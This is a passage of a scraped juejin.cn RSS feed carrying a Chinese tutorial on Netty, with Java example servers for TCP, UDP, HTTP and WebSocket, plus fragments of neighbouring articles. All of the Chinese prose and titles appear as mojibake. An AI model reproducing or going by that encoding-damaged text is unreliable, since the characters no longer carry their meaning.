<p>åœ¨HeartbeatHandlerä¸­ï¼Œæˆ‘ä»¬ç»§æ‰¿ChannelInboundHandlerAdapterï¼Œå¹¶é‡å†™äº†userEventTriggered()æ–¹æ³•ã€‚åœ¨è¯¥æ–¹æ³•ä¸­ï¼Œæˆ‘ä»¬æ ¹æ®IdleStateEventçš„çŠ¶æ€æ¥åˆ¤æ–­æ˜¯å¦å‘é€å¿ƒè·³æ¶ˆæ¯ã€‚å¦‚æœè¿æ¥å¤„äºå†™ç©ºé—²çŠ¶æ€ï¼Œå³é•¿æ—¶é—´æ²¡æœ‰å†™æ“ä½œï¼Œæˆ‘ä»¬å°±å‘é€ä¸€ä¸ªå¿ƒè·³æ¶ˆæ¯ã€‚</p>
<p>é€šè¿‡ä½¿ç”¨IdleStateHandlerå’ŒHeartbeatHandlerï¼Œæˆ‘ä»¬å¯ä»¥å®ç°å®¢æˆ·ç«¯çš„å¿ƒè·³æœºåˆ¶ï¼Œå®šæœŸå‘é€å¿ƒè·³æ¶ˆæ¯ä»¥ä¿æŒè¿æ¥çš„æ´»è·ƒçŠ¶æ€ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Nettyï¼ˆ12ï¼‰Nettyæ”¯æŒå“ªäº›åè®®å’Œä¼ è¾“æ–¹å¼ï¼Ÿ]]></title>    <link>https://juejin.cn/post/7583891046206226484</link>    <guid>https://juejin.cn/post/7583891046206226484</guid>    <pubDate>2025-12-15T12:02:00.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583891046206226484" data-draft-id="7583891046206210100" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Nettyï¼ˆ12ï¼‰Nettyæ”¯æŒå“ªäº›åè®®å’Œä¼ è¾“æ–¹å¼ï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-15T12:02:00.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Nettyï¼ˆ12ï¼‰Nettyæ”¯æŒå“ªäº›åè®®å’Œä¼ è¾“æ–¹å¼ï¼Ÿ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3492507879476878/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Victor356
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-15T12:02:00.000Z" title="Mon Dec 15 2025 12:02:00 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»2åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Nettyæ˜¯ä¸€ä¸ªé«˜æ€§èƒ½çš„ç½‘ç»œåº”ç”¨ç¨‹åºæ¡†æ¶ï¼Œå®ƒæ”¯æŒå¤šç§åè®®å’Œä¼ è¾“æ–¹å¼ã€‚ä¸‹é¢æ˜¯ä¸€äº›å¸¸è§çš„åè®®å’Œä¼ è¾“æ–¹å¼ï¼Œä»¥åŠä½¿ç”¨Nettyå®ç°çš„ç¤ºä¾‹ä»£ç ï¼š</p>
<ol>
<li>TCPåè®®ï¼š</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> io.netty.bootstrap.ServerBootstrap;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelFuture;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelInitializer;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelOption;
<span class="hljs-keyword">import</span> io.netty.channel.EventLoopGroup;
<span class="hljs-keyword">import</span> io.netty.channel.nio.NioEventLoopGroup;
<span class="hljs-keyword">import</span> io.netty.channel.socket.SocketChannel;
<span class="hljs-keyword">import</span> io.netty.channel.socket.nio.NioServerSocketChannel;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TcpServer</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> port;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TcpServer</span><span class="hljs-params">(<span class="hljs-type">int</span> port)</span> {
        <span class="hljs-built_in">this</span>.port = port;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">EventLoopGroup</span> <span class="hljs-variable">bossGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NioEventLoopGroup</span>();
        <span class="hljs-type">EventLoopGroup</span> <span class="hljs-variable">workerGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NioEventLoopGroup</span>();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">ServerBootstrap</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerBootstrap</span>();
            b.group(bossGroup, workerGroup)
                    .channel(NioServerSocketChannel.class)
                    .childHandler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChannelInitializer</span>&lt;SocketChannel&gt;() {
                        <span class="hljs-meta">@Override</span>
                        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initChannel</span><span class="hljs-params">(SocketChannel ch)</span> <span class="hljs-keyword">throws</span> Exception {
                            ch.pipeline().addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TcpServerHandler</span>());
                        }
                    })
                    .option(ChannelOption.SO_BACKLOG, <span class="hljs-number">128</span>)
                    .childOption(ChannelOption.SO_KEEPALIVE, <span class="hljs-literal">true</span>);

            <span class="hljs-type">ChannelFuture</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> b.bind(port).sync();
            f.channel().closeFuture().sync();
        } <span class="hljs-keyword">finally</span> {
            workerGroup.shutdownGracefully();
            bossGroup.shutdownGracefully();
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">8080</span>;
        <span class="hljs-type">TcpServer</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TcpServer</span>(port);
        server.run();
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TcpServerHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ChannelInboundHandlerAdapter</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">channelRead</span><span class="hljs-params">(ChannelHandlerContext ctx, Object msg)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// å¤„ç†æ”¶åˆ°çš„æ¶ˆæ¯</span>
        <span class="hljs-comment">// ...</span>
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exceptionCaught</span><span class="hljs-params">(ChannelHandlerContext ctx, Throwable cause)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// å¤„ç†å¼‚å¸¸</span>
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<ol start="2">
<li>UDPåè®®ï¼š</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> io.netty.bootstrap.Bootstrap;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelFuture;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelInitializer;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelOption;
<span class="hljs-keyword">import</span> io.netty.channel.EventLoopGroup;
<span class="hljs-keyword">import</span> io.netty.channel.nio.NioEventLoopGroup;
<span class="hljs-keyword">import</span> io.netty.channel.socket.DatagramChannel;
<span class="hljs-keyword">import</span> io.netty.channel.socket.nio.NioDatagramChannel;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UdpServer</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> port;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">UdpServer</span><span class="hljs-params">(<span class="hljs-type">int</span> port)</span> {
        <span class="hljs-built_in">this</span>.port = port;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">EventLoopGroup</span> <span class="hljs-variable">group</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NioEventLoopGroup</span>();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">Bootstrap</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Bootstrap</span>();
            b.group(group)
                    .channel(NioDatagramChannel.class)
                    .option(ChannelOption.SO_BROADCAST, <span class="hljs-literal">true</span>)
                    .handler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChannelInitializer</span>&lt;DatagramChannel&gt;() {
                        <span class="hljs-meta">@Override</span>
                        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initChannel</span><span class="hljs-params">(DatagramChannel ch)</span> <span class="hljs-keyword">throws</span> Exception {
                            ch.pipeline().addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">UdpServerHandler</span>());
                        }
                    });

            <span class="hljs-type">ChannelFuture</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> b.bind(port).sync();
            f.channel().closeFuture().sync();
        } <span class="hljs-keyword">finally</span> {
            group.shutdownGracefully();
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">8080</span>;
        <span class="hljs-type">UdpServer</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UdpServer</span>(port);
        server.run();
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UdpServerHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SimpleChannelInboundHandler</span>&lt;DatagramPacket&gt; {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">channelRead0</span><span class="hljs-params">(ChannelHandlerContext ctx, DatagramPacket msg)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// å¤„ç†æ”¶åˆ°çš„æ¶ˆæ¯</span>
        <span class="hljs-comment">// ...</span>
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exceptionCaught</span><span class="hljs-params">(ChannelHandlerContext ctx, Throwable cause)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// å¤„ç†å¼‚å¸¸</span>
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<ol start="3">
<li>HTTPåè®®ï¼š</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> io.netty.bootstrap.ServerBootstrap;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelFuture;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelInitializer;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelOption;
<span class="hljs-keyword">import</span> io.netty.channel.EventLoopGroup;
<span class="hljs-keyword">import</span> io.netty.channel.nio.NioEventLoopGroup;
<span class="hljs-keyword">import</span> io.netty.channel.socket.SocketChannel;
<span class="hljs-keyword">import</span> io.netty.channel.socket.nio.NioServerSocketChannel;
<span class="hljs-keyword">import</span> io.netty.handler.codec.http.HttpObjectAggregator;
<span class="hljs-keyword">import</span> io.netty.handler.codec.http.HttpServerCodec;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpServer</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> port;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">HttpServer</span><span class="hljs-params">(<span class="hljs-type">int</span> port)</span> {
        <span class="hljs-built_in">this</span>.port = port;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">EventLoopGroup</span> <span class="hljs-variable">bossGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NioEventLoopGroup</span>();
        <span class="hljs-type">EventLoopGroup</span> <span class="hljs-variable">workerGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NioEventLoopGroup</span>();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">ServerBootstrap</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerBootstrap</span>();
            b.group(bossGroup, workerGroup)
                    .channel(NioServerSocketChannel.class)
                    .childHandler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChannelInitializer</span>&lt;SocketChannel&gt;() {
                        <span class="hljs-meta">@Override</span>
                        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initChannel</span><span class="hljs-params">(SocketChannel ch)</span> <span class="hljs-keyword">throws</span> Exception {
                            ch.pipeline().addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpServerCodec</span>());
                            ch.pipeline().addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpObjectAggregator</span>(<span class="hljs-number">65536</span>));
                            ch.pipeline().addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpServerHandler</span>());
                        }
                    })
                    .option(ChannelOption.SO_BACKLOG, <span class="hljs-number">128</span>)
                    .childOption(ChannelOption.SO_KEEPALIVE, <span class="hljs-literal">true</span>);

            <span class="hljs-type">ChannelFuture</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> b.bind(port).sync();
            f.channel().closeFuture().sync();
        } <span class="hljs-keyword">finally</span> {
            workerGroup.shutdownGracefully();
            bossGroup.shutdownGracefully();
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">8080</span>;
        <span class="hljs-type">HttpServer</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpServer</span>(port);
        server.run();
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HttpServerHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SimpleChannelInboundHandler</span>&lt;FullHttpRequest&gt; {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">channelRead0</span><span class="hljs-params">(ChannelHandlerContext ctx, FullHttpRequest request)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// å¤„ç†HTTPè¯·æ±‚</span>
        <span class="hljs-comment">// ...</span>
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exceptionCaught</span><span class="hljs-params">(ChannelHandlerContext ctx, Throwable cause)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// å¤„ç†å¼‚å¸¸</span>
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<ol start="4">
<li>WebSocketåè®®ï¼š</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> io.netty.bootstrap.ServerBootstrap;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelFuture;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelInitializer;
<span class="hljs-keyword">import</span> io.netty.channel.ChannelOption;
<span class="hljs-keyword">import</span> io.netty.channel.EventLoopGroup;
<span class="hljs-keyword">import</span> io.netty.channel.nio.NioEventLoopGroup;
<span class="hljs-keyword">import</span> io.netty.channel.socket.SocketChannel;
<span class="hljs-keyword">import</span> io.netty.channel.socket.nio.NioServerSocketChannel;
<span class="hljs-keyword">import</span> io.netty.handler.codec.http.HttpObjectAggregator;
<span class="hljs-keyword">import</span> io.netty.handler.codec.http.HttpServerCodec;
<span class="hljs-keyword">import</span> io.netty.handler.codec.http.websocketx.WebSocketFrameAggregator;
<span class="hljs-keyword">import</span> io.netty.handler.codec.http.websocketx.WebSocketServerProtocolHandler;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebSocketServer</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> port;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">WebSocketServer</span><span class="hljs-params">(<span class="hljs-type">int</span> port)</span> {
        <span class="hljs-built_in">this</span>.port = port;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">EventLoopGroup</span> <span class="hljs-variable">bossGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NioEventLoopGroup</span>();
        <span class="hljs-type">EventLoopGroup</span> <span class="hljs-variable">workerGroup</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NioEventLoopGroup</span>();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-type">ServerBootstrap</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ServerBootstrap</span>();
            b.group(bossGroup, workerGroup)
                    .channel(NioServerSocketChannel.class)
                    .childHandler(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ChannelInitializer</span>&lt;SocketChannel&gt;() {
                        <span class="hljs-meta">@Override</span>
                        <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">initChannel</span><span class="hljs-params">(SocketChannel ch)</span> <span class="hljs-keyword">throws</span> Exception {
                            ch.pipeline().addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpServerCodec</span>());
                            ch.pipeline().addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpObjectAggregator</span>(<span class="hljs-number">65536</span>));
                            ch.pipeline().addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocketFrameAggregator</span>(<span class="hljs-number">65536</span>));
                            ch.pipeline().addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocketServerProtocolHandler</span>(<span class="hljs-string">"/websocket"</span>));
                            ch.pipeline().addLast(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocketServerHandler</span>());
                        }
                    })
                    .option(ChannelOption.SO_BACKLOG, <span class="hljs-number">128</span>)
                    .childOption(ChannelOption.SO_KEEPALIVE, <span class="hljs-literal">true</span>);

            <span class="hljs-type">ChannelFuture</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> b.bind(port).sync();
            f.channel().closeFuture().sync();
        } <span class="hljs-keyword">finally</span> {
            workerGroup.shutdownGracefully();
            bossGroup.shutdownGracefully();
        }
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">8080</span>;
        <span class="hljs-type">WebSocketServer</span> <span class="hljs-variable">server</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocketServer</span>(port);
        server.run();
    }
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WebSocketServerHandler</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">SimpleChannelInboundHandler</span>&lt;WebSocketFrame&gt; {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">channelRead0</span><span class="hljs-params">(ChannelHandlerContext ctx, WebSocketFrame frame)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// å¤„ç†WebSocketå¸§</span>
        <span class="hljs-comment">// ...</span>
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">exceptionCaught</span><span class="hljs-params">(ChannelHandlerContext ctx, Throwable cause)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">// å¤„ç†å¼‚å¸¸</span>
        <span class="hljs-comment">// ...</span>
    }
}
</code></pre>
<p>ä¸Šé¢çš„ç¤ºä¾‹ä»£ç å±•ç¤ºäº†ä½¿ç”¨Nettyå®ç°TCPã€UDPã€HTTPå’ŒWebSocketåè®®çš„æœåŠ¡å™¨ã€‚é€šè¿‡ä½¿ç”¨ä¸åŒçš„Channelå’Œå¤„ç†å™¨ï¼Œå¯ä»¥å®ç°ä¸åŒåè®®çš„æ”¯æŒã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js å·¥å…·æ¨¡å—è¯¦è§£]]></title>    <link>https://juejin.cn/post/7583910637957578771</link>    <guid>https://juejin.cn/post/7583910637957578771</guid>    <pubDate>2025-12-15T09:34:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7583910637957578771" data-draft-id="7582393212767404086" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js å·¥å…·æ¨¡å—è¯¦è§£"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2025-12-15T09:34:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ¢¨å­åŒå¿—"/> <meta itemprop="url" content="https://juejin.cn/user/2084329779627965"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" 